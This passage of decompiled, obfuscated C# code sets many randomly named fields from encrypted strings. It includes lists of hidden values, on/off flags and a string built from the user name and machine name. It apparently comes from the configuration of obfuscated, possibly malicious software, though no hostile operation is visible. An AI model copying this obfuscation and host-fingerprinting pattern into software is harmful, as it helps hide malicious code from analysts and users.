			ZvzUuZdcuZvZyuA(getString_0(107406875)),
			ZvzUuZdcuZvZyuA(getString_0(107406782)),
			ZvzUuZdcuZvZyuA(getString_0(107406173)),
			ZvzUuZdcuZvZyuA(getString_0(107406112)),
			ZvzUuZdcuZvZyuA(getString_0(107405983)),
			ZvzUuZdcuZvZyuA(getString_0(107406434)),
			ZvzUuZdcuZvZyuA(getString_0(107406337)),
			ZvzUuZdcuZvZyuA(getString_0(107406244)),
			ZvzUuZdcuZvZyuA(gZenGKRaZbbcTPvN(getString_0(107407336)))
		};
		oUJkScAGYiOuk = ZvzUuZdcuZvZyuA(getString_0(107405635));
		MszUcjKHBHsCixH = new List<string>
		{
			ZvzUuZdcuZvZyuA(getString_0(107405490)),
			ZvzUuZdcuZvZyuA(getString_0(107405808)),
			ZvzUuZdcuZvZyuA(getString_0(107405134)),
			ZvzUuZdcuZvZyuA(getString_0(107404940)),
			ZvzUuZdcuZvZyuA(getString_0(107405258)),
			ZvzUuZdcuZvZyuA(getString_0(107404552))
		};
		wJRTZLiIcovO = new List<string>
		{
			ZvzUuZdcuZvZyuA(getString_0(107404870)),
			ZvzUuZdcuZvZyuA(getString_0(107404809)),
			ZvzUuZdcuZvZyuA(getString_0(107404748))
		};
		qdHREpNAkxovuyp = getString_0(107396382);
		qCqrcjMgIH = getString_0(107396382);
		fgeLRZJmOwKtpeQ = new DateTime(2000, 1, 1);
		zKUkTflbfxFJgb = new DateTime(2100, 1, 1);
		AjDKbvSruxge = getString_0(107396816);
		vmbpzaFVaVU = getString_0(107386630);
		DoejNTXBreRUtu = getString_0(107396382);
		yZhHOqBFjgJAALJ = getString_0(107396382);
		pNwCRAugOpbK = getString_0(107396382);
		nPCmRKlbctnEy = getString_0(107396816);
		UyxUbeNFsOiz = getString_0(107396382);
		FGSbbxnupor = getString_0(107396382);
		SkvTXsJINBztMRD = new List<string>
		{
			getString_0(107396056),
			getString_0(107395258),
			getString_0(107396090),
			getString_0(107395683)
		};
		eiZgJNzJZhH = getString_0(107396382);
		QBNkovNHjRPLm = getString_0(107404687);
		PbLrAHudJtI = getString_0(107396382);
		NsXmyOpOsw = getString_0(107396382);
		QbbecTAQBWOQL = getString_0(107396382);
		iLUZulQmned = string.Empty;
		fmaLHmxxTwZD = getString_0(107396382);
		peHZbsiUHe = getString_0(107396816);
		yrnseMuKTJXN = getString_0(107396816);
		vxtPpKhCdVI = getString_0(107404682);
		HadOpfWYYmVK = getString_0(107404097);
		XOepnAmRVy = getString_0(107396382);
		xUjiDYXnYV = getString_0(107396382);
		eCuVMSxuue = getString_0(107396382);
		DtTyjpOYkwPmOK = getString_0(107396382);
		mZgbiGZHholE = getString_0(107396382);
		OhgfYyCwZIzrk = getString_0(107389826);
		PTZajYvtKdl = getString_0(107396382);
		nXbCZlCuvFql = getString_0(107396382);
		hdtcmoyGEV = getString_0(107403751);
		oAHTjawhYVeZf = getString_0(107396382);
		MnvGgRhyVj = getString_0(107396382);
		nVMXzpSiOWw = getString_0(107396382);
		wIBBVlTRMlGJsj = getString_0(107396382);
		HRRvwQDpth = getString_0(107403702);
		WOzPZCKnrUtVm = getString_0(107396816);
		IiqKblfhNFuY = getString_0(107396816);
		PfvUWLRmLLJxJfuB = getString_0(107396382);
		LsSyLAcPVPjhbnX = getString_0(107396382);
		yURxqNIzRnSLu = new string[0];
		uEKpoPMiNFZ = getString_0(107396816);
		CcJcTYoshtYbPYb = true;
		GUROFNYdsapXwV = getString_0(107396816);
		dludHStvHyTu = true;
		siUmudLEnyH = true;
		bdKOcjKUUjHwlc = false;
		qyQHkbOmTCffuf = false;
		knClGxGTQzcKgW = getString_0(107403721);
		MvyzXvhzMsIEWT = false;
		gZUmygLlxNNdJl = false;
		pcwRfMRGnwC = false;
		YMNrvxnhNxvEzz = false;
		kIbCIqqAMtB = true;
		WkbYpntLeHaVcf = getString_0(107403668) + Environment.UserName + getString_0(107403687) + Environment.MachineName + getString_0(107403634) + PpFuqDxUfCPuFpcCn.zsSYEipMaODL() + getString_0(107403661);
		hdAepnrmnch = true;
		iprsjxEHICCj = new Stopwatch();
		bBKKzTBaLJVhdj = 0;
		ZxYqzVUoLKX = 0;
		mYYMBtfmlAOyF = false;
		zmgIWyNctPwjW = getString_0(107403652) + PpFuqDxUfCPuFpcCn.zsSYEipMaODL() + getString_0(107403099);
		WxFKBJOglGuZ = new string[1] { getString_0(107403094) };
		rvGughPBDES = new List<string>();
		FBFvSEsTvDQJXR = 0;
		kwNUHYKFODh = true;
		MGTkXQOIDkk = true;
	}
}
